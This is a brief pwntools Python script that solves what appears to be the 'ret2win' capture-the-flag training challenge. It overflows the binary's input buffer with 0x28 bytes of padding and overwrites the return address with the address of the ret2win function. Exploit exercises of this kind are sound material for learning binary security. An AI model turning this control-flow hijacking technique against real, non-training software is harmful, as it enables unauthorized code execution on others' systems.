#!/usr/bin/python 
from pwn import *

p = process("./ret2win")
elf = ELF("./ret2win")
ret2win = elf.symbols['ret2win']

pay = 'A'*0x28 + p64(ret2win)

p.sendlineafter("> ", pay)

p.interactive()
